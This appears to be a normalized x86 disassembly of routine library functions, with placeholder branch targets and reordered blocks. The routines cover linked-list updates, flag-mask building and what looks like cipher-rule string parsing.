mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov edx [ edi + 0x8 ]
push esi
push edx
call sub_1001fe60
mov eax [ edi ]
push esi
push eax
call sub_1000fb90
mov [ esi + 0x8c ] 0x1
mov edi [ edi ]
add esp 0x10
mov eax [ edi + 0x2c ]
test eax eax
je r-xdata
mov ecx [ esi + 0xa4 ]
mov edx [ esi + 0xa0 ]
add ecx edx
cmp eax ecx
jle r-xdata
push esi
call sub_1000f8e0
add esp 0x4
push esi
push edi
call eax
add esp 0x8
pop edi
pop esi
retn
sub_1000faa0
push edi
mov edi [ esp + 0x8 ]
mov eax [ edi + 0xbc ]
test eax eax
je r-xdata
xor eax eax
pop edi
retn
test [ edi + 0x30 ] 0x1
jne r-xdata
push edi
call sub_1000e7d0
add esp 0x4
test ah 0x30
jne r-xdata
push edi
call sub_1000e7d0
add esp 0x4
test ah 0x40
jne r-xdata
push ebx
push ebp
push esi
mov esi [ edi + 0xbc ]
mov edi [ edi + 0xd8 ]
xor ebx ebx
test esi esi
je r-xdata
pop esi
pop ebp
pop ebx
mov eax 0x1
pop edi
retn
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push 0x221
push r--data
push 0xc
push 0x9
call sub_1001f5b0
mov eax [ edi + 0x10 ]
push esi
push eax
call sub_1001ff80
mov ebp eax
add esp 0x18
cmp ebp esi
jne r-xdata
push 0x229
push r--data
push 0xc
push 0xa
call sub_1001f5b0
add esp 0x10
test ebx ebx
je r-xdata
mov ecx [ edi + 0x10 ]
push esi
push ecx
mov ebx 0x1
call sub_1001fe60
push esi
push edi
mov ebp eax
call sub_1000fb90
add esp 0x10
mov [ ebp + 0x8c ] 0x1
mov eax [ edi + 0x2c ]
test eax eax
je r-xdata
push ebp
call sub_1000f8e0
add esp 0x4
push ebp
push edi
call eax
add esp 0x8
sub_1000fb90
mov ecx [ esp + 0x8 ]
push esi
mov esi [ ecx + 0xc4 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ ecx + 0xc0 ]
test eax eax
je r-xdata
push edi
mov edi [ esp + 0xc ]
lea edx [ edi + 0x1c ]
cmp esi edx
jne r-xdata
lea edx [ edi + 0x18 ]
cmp eax edx
jne r-xdata
lea esi [ edi + 0x18 ]
cmp eax esi
jne r-xdata
mov [ esi + 0xc0 ] eax
mov edx [ ecx + 0xc0 ]
mov eax [ ecx + 0xc4 ]
mov [ edx + 0xc4 ] eax
mov [ edx ] esi
mov eax [ ecx + 0xc4 ]
mov [ eax + 0xc0 ] edx
jmp r-xdata
mov [ edx ] eax
mov eax [ ecx + 0xc0 ]
mov [ eax + 0xc4 ] edx
jmp r-xdata
mov [ esi ] 0x0
mov [ edx ] 0x0
jmp r-xdata
mov [ ecx + 0xc4 ] 0x0
mov [ ecx + 0xc0 ] 0x0
pop edi
sub_1000fc20
push r--data
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b10
push r--data
mov [ rw-data ] eax
call sub_10021b20
push r--data
mov [ rw-data ] eax
call sub_10021b20
add esp 0x30
mov [ rw-data ] eax
retn
sub_1000fce0
mov eax 0xc
call sub_1001d0d0
push ebx
push esi
push edi
mov edi [ esp + 0x1c ]
mov ebx [ edi + 0xac ]
test ebx ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0xc
retn
mov esi [ esp + 0x28 ]
test esi esi
je r-xdata
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
call sub_1000ff00
mov [ esi ] 0x0
mov eax [ edi + 0xa8 ]
mov [ esp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi [ esp + 0x24 ]
test edi edi
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
push eax
call sub_1001e620
add esp 0x8
test eax eax
jl r-xdata
mov eax [ ebx + 0xc ]
and eax 0x1c3f8000
cmp eax 0x80000
ja r-xdata
mov [ esi ] 0x0
mov edx [ rw-data ]
push eax
push edx
call sub_1001e7c0
add esp 0x8
mov [ esi ] eax
jmp r-xdata
cmp eax 0x8000000
ja r-xdata
je r-xdata
cmp eax __dos_header
jne r-xdata
je r-xdata
mov eax 0x4
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
cmp eax 0x20000
ja r-xdata
mov [ esi ] 0x0
mov eax 0xb
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
mov eax [ ebx + 0x1c ]
cmp eax 0x80
je r-xdata
cmp eax 0x200000
je r-xdata
mov eax [ ebx + 0xc ]
and eax 0xc00000
cmp eax 0x400000
je r-xdata
cmp eax 0x40000
jne r-xdata
je r-xdata
xor eax eax
mov ecx [ eax * 4 + rw-data ]
mov [ edi ] ecx
jmp r-xdata
cmp eax 0x800000
jne r-xdata
mov eax 0x9
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
cmp eax 0x100
jne r-xdata
call sub_100269a0
mov [ esi ] eax
jmp r-xdata
cmp eax 0x4000000
jne r-xdata
mov eax 0x3
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
mov eax 0x2
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
cmp eax 0x8000
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov [ edi ] 0x0
mov eax 0x1
mov ecx [ eax * 4 + rw-data ]
mov [ edi ] ecx
jmp r-xdata
mov eax 0xa
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
mov eax [ ebx + 0x1c ]
cmp eax 0x80
je r-xdata
xor eax eax
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
cmp eax 0x10000
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax 0x7
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
cmp eax 0x100
jne r-xdata
mov eax 0x1
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0xc
retn
mov eax 0x8
mov eax [ eax * 4 + rw-data ]
mov [ esi ] eax
jmp r-xdata
sub_1000ff00
push 0x115
push r--data
push 0x10
push 0x5
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
push 0x13a
push r--data
push 0x10
push 0x6
call sub_1001f5b0
add esp 0x10
retn
push 0x118
push r--data
push 0x10
push 0x6
call sub_1001f5b0
push 0x119
push r--data
push 0x10
push 0x9
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x20
test eax eax
jne r-xdata
push 0x138
push r--data
push 0x10
push 0xa
call sub_1001f5b0
add esp 0x10
retn
push esi
push 0x3
call sub_100269f0
push sub_10055c90
call sub_1001e440
add esp 0x8
mov [ rw-data ] eax
test eax eax
je r-xdata
push 0x2
call sub_100269f0
add esp 0x4
pop esi
push 0x124
push r--data
push 0xc
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
call sub_100269e0
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov [ esi ] 0x1
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ rw-data ]
push esi
push ecx
call sub_1001e6c0
add esp 0x8
cmp [ eax ] 0x0
jne r-xdata
push esi
call sub_1001d740
add esp 0x4
jmp r-xdata
sub_10010000
mov eax 0x14
call sub_1001d0d0
mov eax [ esp + 0x24 ]
push ebx
xor ebx ebx
push ebp
push esi
cmp eax ebx
push edi
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
cmp [ esp + 0x2c ] ebx
je r-xdata
cmp [ esp + 0x30 ] ebx
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
neg eax
sbb eax eax
mov edx [ rw-data ]
and eax 0xf0000000
mov esi [ rw-data ]
add eax __dos_header
mov edi [ rw-data ]
neg ecx
sbb ecx ecx
and ecx 0xff800000
add ecx 0x800000
or eax ecx
mov ecx [ rw-data ]
neg edx
sbb edx edx
and edx 0xffc00000
add edx 0x400000
or eax edx
mov edx [ rw-data ]
neg ecx
sbb ecx ecx
and ecx 0xfff00000
add ecx 0x100000
or eax ecx
mov ecx [ rw-data ]
neg edx
sbb edx edx
and edx 0xfff80000
add edx 0x80000
or eax edx
mov edx [ rw-data ]
neg ecx
sbb ecx ecx
and ecx 0xfffc0000
add ecx 0x40000
or eax ecx
mov ecx [ rw-data ]
neg edx
sbb edx edx
and edx 0xfffe0000
add edx 0x20000
or eax edx
mov edx [ rw-data ]
neg ecx
sbb ecx ecx
and ecx 0xffff0000
add ecx 0x10000
or eax ecx
mov ecx [ rw-data ]
neg edx
sbb edx edx
and edx 0xffff8000
add edx 0x8000
or eax edx
mov edx [ rw-data ]
or eax 0x2028
neg esi
sbb esi esi
and esi 0xf8000000
add esi 0x8000000
neg ecx
sbb ecx ecx
and ecx 0xfc000000
add ecx 0x4000000
or esi ecx
or esi eax
neg edi
sbb edi edi
and edi 0xf8000000
add edi 0x8000000
neg edx
sbb edx edx
and edx 0xfc000000
add edx 0x4000000
or edi edx
or edi eax
mov eax [ esp + 0x28 ]
call [ eax + 0x54 ]
mov ebp eax
lea ecx [ ebp + ebp * 4 ]
push 0x3e1
shl ecx 0x2
push r--data
push ecx
call sub_1001d4c0
mov ecx eax
add esp 0xc
cmp ecx ebx
mov [ esp + 0x10 ] ecx
jne r-xdata
xor edx edx
cmp ebp ebx
mov [ esp + 0x20 ] edx
mov [ esp + 0x1c ] ebx
jle r-xdata
push 0x3e4
push r--data
push 0x41
push 0xa6
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
lea ebx [ edx - 0x1 ]
cmp ebx 0x1
jle r-xdata
lea ebx [ ecx + 0x10 ]
test edx edx
jle r-xdata
dec ebx
lea eax [ ecx + 0x24 ]
mov [ esp + 0x28 ] ebx
mov eax [ esp + 0x1c ]
inc eax
cmp eax ebp
mov [ esp + 0x1c ] eax
jl r-xdata
cmp [ eax ] edx
je r-xdata
push 0x3f6
lea eax [ ebp * 4 + 0xc4 ]
push r--data
push eax
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
jne r-xdata
mov [ esp + 0x14 ] ecx
mov [ ecx + 0x10 ] 0x0
mov ebx [ esp + 0x14 ]
lea eax [ ecx + 0x14 ]
mov [ ebx + 0xc ] eax
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 - 0xa ]
lea eax [ ecx + eax * 4 - 0x14 ]
lea ecx [ ecx + edx * 4 ]
mov [ esp + 0x18 ] eax
mov [ eax + 0x10 ] ecx
mov edx [ esp + 0x18 ]
mov [ edx + 0xc ] 0x0
lea ebx [ eax - 0x24 ]
mov [ eax ] ebx
lea ebx [ eax + 0x4 ]
mov [ eax - 0x4 ] ebx
mov ebx [ esp + 0x28 ]
add eax 0x14
dec ebx
mov [ esp + 0x28 ] ebx
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x28 ]
push edx
call [ eax + 0x58 ]
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
mov ecx [ eax + 0x1c ]
cmp ecx 0x100
mov ecx edi
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx ebp
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_1001d740
push 0x3fa
push r--data
push 0x41
push 0xa6
push 0x14
call sub_1001de60
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
test [ eax + 0xc ] ecx
jne r-xdata
mov ecx esi
mov eax r--data
mov edx [ eax ]
mov [ ecx ] edx
mov eax [ eax + 0xc ]
add ecx 0x4
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov [ ebx - 0x10 ] eax
mov [ ebx - 0x4 ] edx
mov [ ebx ] edx
inc ecx
mov [ ebx - 0xc ] edx
mov [ esp + 0x20 ] ecx
add ebx 0x14
mov [ ecx ] eax
add ecx 0x4
mov edx [ eax + 0xc ]
and edx edi
test esi edx
jne r-xdata
cmp eax r--data
je r-xdata
mov esi [ esp + 0x34 ]
push 0x7
push r--data
push esi
mov [ ecx ] 0x0
mov ebx 0x1
call strncmp
add esp 0xc
test eax eax
jne r-xdata
add eax 0x28
cmp eax r--data
jl r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x18 ]
push ebp
lea ecx [ esp + 0x18 ]
push eax
push ecx
push edx
push r--data
call sub_10010470
add esi 0x7
mov ebx eax
add esp 0x14
cmp [ esi ] 0x3a
jne r-xdata
push ebp
call sub_1001d740
add esp 0x4
test ebx ebx
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x18 ]
push ebp
lea ecx [ esp + 0x18 ]
push eax
push ecx
push edx
push esi
call sub_10010470
add esp 0x14
mov ebx eax
test ebx ebx
je r-xdata
inc esi
call sub_1001e3c0
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_1001d740
add esp 0x4
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax [ esp + 0x10 ]
push eax
call sub_1001d740
push edi
call sub_1001e2e0
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ebx [ esp + 0x2c ]
mov eax [ ebx ]
test eax eax
je r-xdata
push edi
call sub_1001e780
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
mov edx [ esi ]
push edx
push edi
call sub_1001e6c0
add esp 0x8
mov [ ebx ] edi
mov ebx [ esp + 0x30 ]
mov eax [ ebx ]
test eax eax
je r-xdata
push eax
call sub_1001e780
add esp 0x4
push sub_1000dde0
push esi
mov [ ebx ] esi
call sub_1001e2c0
add esp 0x8
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push eax
call sub_1001e780
add esp 0x4
sub_10010470
mov eax 0x30
call sub_1001d0d0
mov eax [ esp + 0x34 ]
push ebx
push ebp
push esi
mov esi eax
mov al [ eax ]
push edi
xor edi edi
mov ecx 0x1
mov [ esp + 0x34 ] edi
test al al
mov [ esp + 0x30 ] edi
mov [ esp + 0x1c ] ecx
mov [ esp + 0x44 ] esi
je r-xdata
pop edi
pop esi
pop ebp
mov eax ecx
pop ebx
add esp 0x30
retn
cmp al 0x2d
jne r-xdata
cmp al 0x2b
jne r-xdata
inc esi
mov [ esp + 0x10 ] 0x3
mov [ esp + 0x44 ] esi
jmp r-xdata
cmp al 0x21
jne r-xdata
inc esi
mov [ esp + 0x10 ] 0x4
mov [ esp + 0x44 ] esi
jmp r-xdata
mov [ esp + 0x14 ] edi
mov [ esp + 0x2c ] edi
mov [ esp + 0x18 ] edi
xor ebp ebp
cmp al 0x40
jne r-xdata
inc esi
mov [ esp + 0x10 ] 0x2
mov [ esp + 0x44 ] esi
jmp r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x5a
jle r-xdata
cmp al 0x3a
mov [ esp + 0x10 ] 0x1
je r-xdata
inc esi
mov [ esp + 0x10 ] 0x5
mov [ esp + 0x44 ] esi
jmp r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x39
jle r-xdata
mov al [ esi + 0x1 ]
inc esi
inc ebx
jmp r-xdata
inc esi
mov [ esp + 0x44 ] esi
cmp al 0x20
je r-xdata
cmp al 0x2d
jne r-xdata
cmp al 0x7a
jle r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x3b
je r-xdata
cmp ebx edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x44 ] esi
je r-xdata
cmp al 0x2c
je r-xdata
push 0x347
push r--data
push 0x118
push 0xe6
push 0x14
call sub_1001de60
add esp 0x14
inc esi
mov [ esp + 0x28 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x44 ] esi
jmp r-xdata
cmp [ esp + 0x10 ] 0x5
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0x5
jne r-xdata
cmp ebx 0x8
jne r-xdata
cmp al 0x2b
jne r-xdata
cmp [ esp + 0x28 ] edi
je r-xdata
push 0x39d
push r--data
push 0x118
push 0xe6
push 0x14
call sub_1001de60
add esp 0x14
mov edx [ esp + 0x3c ]
push ebx
push r--data
push edx
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov [ esp + 0x38 ] edi
inc esi
mov [ esp + 0x38 ] 0x1
mov [ esp + 0x44 ] esi
jmp r-xdata
mov al [ esi ]
test al al
je r-xdata
mov edx [ esp + 0x50 ]
mov ecx [ esp + 0x4c ]
push edx
mov edx [ esp + 0x4c ]
push ecx
mov ecx [ esp + 0x34 ]
push edx
mov edx [ esp + 0x24 ]
push 0xffffffff
push eax
mov eax [ esp + 0x28 ]
push eax
mov eax [ esp + 0x48 ]
push ecx
mov ecx [ esp + 0x50 ]
push edx
push ebp
push eax
push ecx
call sub_100108a0
add esp 0x2c
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp al 0x3a
je r-xdata
mov ebp [ esp + 0x4c ]
xor esi esi
mov eax [ ebp ]
test eax eax
je r-xdata
mov esi eax
mov eax [ esp + 0x54 ]
mov [ esp + 0x28 ] edi
mov [ esp + 0x34 ] edi
mov [ esp + 0x30 ] edi
cmp [ eax ] edi
je r-xdata
cmp al 0x3a
je r-xdata
mov eax [ esp + 0x1c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ esp + 0x1c ]
jmp r-xdata
mov [ esp + 0x44 ] esi
cmp al 0x20
je r-xdata
lea edi [ esi * 4 + 0x4 ]
push 0x2e8
push r--data
push edi
call sub_1001d4c0
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x4 ]
add esi 0x4
inc edi
mov eax esi
test ecx ecx
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + ebx ] 0x0
je r-xdata
cmp al 0x20
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x3b
je r-xdata
mov ecx edi
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ ebp ]
test eax eax
je r-xdata
push 0x2eb
push r--data
push 0x41
push 0xe7
push 0x14
call sub_1001de60
mov esi [ esp + 0x58 ]
add esp 0x14
xor edi edi
jmp r-xdata
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
mov ecx [ eax ]
mov ecx [ ecx + 0x18 ]
cmp ecx esi
jle r-xdata
mov esi [ esp + 0x44 ]
xor edi edi
jmp r-xdata
mov edx [ esp + 0x54 ]
mov esi [ esp + 0x18 ]
not esi
mov eax [ edx + edi * 4 ]
mov [ esp + 0x28 ] 0x1
mov edx [ eax + 0x20 ]
mov ecx [ eax + 0xc ]
mov ebx edx
and esi ecx
not ebx
and ebx ebp
and ecx ebp
or esi ebx
mov ebx [ esp + 0x18 ]
or ebx edx
mov edx [ eax + 0x24 ]
or esi ecx
mov ecx [ eax + 0x10 ]
mov [ esp + 0x18 ] ebx
mov ebx [ esp + 0x14 ]
mov ebp edx
mov [ esp + 0x20 ] esi
mov esi [ esp + 0x2c ]
not ebx
not ebp
and ebx ecx
and ebp esi
or ebx ebp
and ecx esi
mov esi [ esp + 0x14 ]
or ebx ecx
mov ecx [ eax ]
or esi edx
test ecx ecx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x14 ] esi
jne r-xdata
cmp al 0x3b
je r-xdata
cmp al 0x2c
je r-xdata
test esi esi
jl r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ esp + 0x1c ] edi
mov esi ecx
mov eax [ eax ]
mov edx [ esp + 0x3c ]
push ebx
mov ecx [ eax + 0x4 ]
push ecx
push edx
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esp + 0x54 ]
mov ebp [ esp + 0x20 ]
mov edi [ eax + edi * 4 ]
mov ecx [ edi + 0x8 ]
mov edi [ edi + 0xc ]
and edi 0x3000000
mov [ esp + 0x34 ] ecx
mov [ esp + 0x30 ] edi
mov eax [ esp + 0x38 ]
mov ebp [ esp + 0x20 ]
test eax eax
je r-xdata
cmp al 0x2c
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
push ebx
call sub_1001d740
mov esi [ esp + 0x48 ]
add esp 0x4
xor edi edi
jmp r-xdata
lea edi [ ebx + esi * 4 ]
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x18 ]
lea ecx [ ebx + edx * 4 ]
mov edx [ ebx + edx * 4 ]
inc edx
mov [ ecx ] edx
mov ebx [ esp + 0x24 ]
mov esi [ esp + 0x44 ]
xor edi edi
jmp r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
jmp r-xdata
mov al [ esi ]
test al al
je r-xdata
dec esi
sub edi 0x4
test esi esi
jge r-xdata
mov eax [ esp + 0x50 ]
mov ecx [ esp + 0x48 ]
push eax
push ebp
push ecx
push esi
push 0x4
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call sub_100108a0
add esp 0x2c
mov al [ esi ]
xor ebx ebx
mov [ esp + 0x3c ] esi
mov [ esp + 0x24 ] ebx
cmp [ edi ] 0x0
jle r-xdata
sub_100108a0
mov eax 0xc
call sub_1001d0d0
mov ecx [ esp + 0x34 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x44 ]
mov edx [ ecx ]
push edi
mov [ esp + 0x10 ] edx
mov ebx [ esi ]
mov eax edx
test edx edx
mov edi edx
mov [ esp + 0x14 ] ebx
je r-xdata
mov [ ecx ] edx
mov [ esi ] ebx
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
jmp r-xdata
mov esi [ esp + 0x14 ]
mov ecx [ esp + 0x20 ]
cmp eax esi
je r-xdata
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x48 ]
pop edi
pop esi
mov [ eax ] edx
mov [ ecx ] ebx
pop ebp
pop ebx
add esp 0xc
retn
mov esi [ edi + 0xc ]
mov eax edi
add edi 0xc
mov [ esp + 0x18 ] esi
mov esi [ eax ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x3c ]
cmp ecx 0xffffffff
jne r-xdata
mov ebp [ esi + 0xc ]
and ebp 0x3000000
cmp ebp [ esp + 0x24 ]
jne r-xdata
cmp ecx [ esi + 0x18 ]
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esp + 0x2c ]
mov ebp [ esp + 0x34 ]
and ecx edx
mov edx [ esi + 0x10 ]
and edx ebp
test ecx ecx
jne r-xdata
cmp [ esi + 0x8 ] ecx
jne r-xdata
test eax eax
jne r-xdata
mov ecx [ esp + 0x38 ]
cmp ecx 0x1
jne r-xdata
mov ebp ecx
and ebp [ esp + 0x28 ]
cmp ebp ecx
jne r-xdata
test edx edx
je r-xdata
jmp r-xdata
mov edi [ esp + 0x18 ]
cmp ecx 0x4
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x10 ]
mov ebp [ esp + 0x30 ]
mov ecx edx
and ecx ebp
cmp ecx edx
mov edx [ esp + 0x10 ]
je r-xdata
cmp ecx 0x3
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov ebp [ esi + 0xc ]
mov ecx 0x40c0
test ecx ebp
je r-xdata
jmp r-xdata
cmp ecx 0x2
jne r-xdata
mov [ eax + 0x4 ] 0x0
jmp r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
test [ esp + 0x2c ] ecx
jne r-xdata
cmp edx eax
jne r-xdata
cmp eax edx
jne r-xdata
mov [ eax + 0x4 ] 0x1
jmp r-xdata
cmp eax edx
jne r-xdata
mov ecx [ esp + 0x20 ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x10 ]
mov esi [ edi ]
mov [ ecx + 0xc ] esi
mov edx [ edi ]
mov [ esp + 0x10 ] edx
jmp r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov edx [ edi ]
mov [ esp + 0x10 ] edx
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov edx [ edi ]
mov [ esp + 0x10 ] edx
mov ecx [ edi ]
xor esi esi
cmp ecx esi
mov [ eax + 0x4 ] esi
je r-xdata
mov ebx [ eax + 0x10 ]
cmp ebx eax
jne r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov esi [ edi ]
mov [ ecx + 0xc ] esi
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov esi [ edi ]
mov [ ecx + 0xc ] esi
mov ecx [ eax + 0x10 ]
cmp ecx esi
je r-xdata
mov ebp [ eax + 0x10 ]
mov [ ecx + 0x10 ] ebp
mov [ ebx + 0xc ] eax
mov [ eax + 0x10 ] ebx
mov [ edi ] 0x0
mov ebx eax
jmp r-xdata
mov esi [ eax + 0x10 ]
mov [ ecx + 0x10 ] esi
mov [ ebx + 0xc ] eax
mov [ eax + 0x10 ] ebx
mov [ edi ] 0x0
mov ebx eax
mov esi [ eax + 0x10 ]
mov [ ecx + 0x10 ] esi
mov [ edi ] esi
mov [ eax + 0x10 ] esi
jmp r-xdata
mov ebp [ edi ]
mov [ ecx + 0xc ] ebp
sub_10010aa0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
test ebp ebp
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
push edi
call sub_1001e7b0
mov ebx eax
add esp 0x4
xor esi esi
test ebx ebx
jle r-xdata
push esi
push edi
call sub_1001e7c0
mov ecx [ eax ]
add esp 0x8
cmp ecx ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
inc esi
cmp esi ebx
jl r-xdata
sub_10010b00
push 0x8c
push r--data
push 0xc
push 0x5
call sub_1001f5b0
add esp 0x10
mov eax [ rw-data ]
test eax eax
jge r-xdata
push 0x9e
push r--data
push 0xc
push 0x6
call sub_1001f5b0
add esp 0x10
mov eax [ rw-data ]
retn
push 0x90
push r--data
push 0xc
push 0x6
call sub_1001f5b0
push 0x91
push r--data
push 0xc
push 0x9
call sub_1001f5b0
add esp 0x20
mov eax [ rw-data ]
test eax eax
jge r-xdata
push 0x9c
push r--data
push 0xc
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax [ rw-data ]
retn
push 0x0
push 0x0
push 0x0
push r--data
push 0x0
call sub_10028660
add esp 0x14
mov [ rw-data ] eax
sub_10010bb0
push 0xa7
push r--data
push 0x5c
call sub_1001d4c0
mov edx eax
add esp 0xc
test edx edx
jne r-xdata
push edi
mov ecx 0x17
xor eax eax
mov edi edx
[ edi ]
lea eax [ edx + 0x28 ]
mov [ edx + 0x58 ] 0x1
mov [ edx ] eax
mov eax edx
pop edi
retn
push 0xaa
push r--data
push 0x41
push 0xa2
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_10010c10
push ebx
push esi
push edi
push 0xba
push r--data
push 0x5c
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
mov ecx 0x17
xor eax eax
mov edi esi
[ edi ]
mov eax [ ebx ]
sub eax ebx
sub eax 0x28
sar eax 0x3
lea ecx [ esi + eax * 8 + 0x28 ]
mov [ esi ] ecx
mov edx [ ebx + 0x4 ]
mov [ esi + 0x4 ] edx
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ ebx + 0xc ]
mov [ esi + 0xc ] ecx
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
push 0xbd
push r--data
push 0x41
push 0xdd
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x14 ]
mov [ esi + 0x14 ] eax
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_100297d0
mov edx [ ebx + 0x10 ]
add esp 0x4
mov [ esi + 0x10 ] edx
mov edx [ ebx + 0x1c ]
mov [ esi + 0x1c ] edx
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
push eax
push sub_1002a400
push sub_1002a420
call sub_1002a2b0
add esp 0xc
mov [ esi + 0x18 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x24 ]
xor edi edi
mov [ esi + 0x24 ] eax
push eax
call sub_100291c0
add esp 0x4
mov [ esi + 0x20 ] eax
test eax eax
jne r-xdata
mov ecx [ ebx + 0x18 ]
mov eax [ ecx + 0x18 ]
test eax eax
je r-xdata
push 0xda
push r--data
push 0x5
jmp r-xdata
mov eax [ ebx + edi * 8 + 0x2c ]
test eax eax
je r-xdata
push 0x108
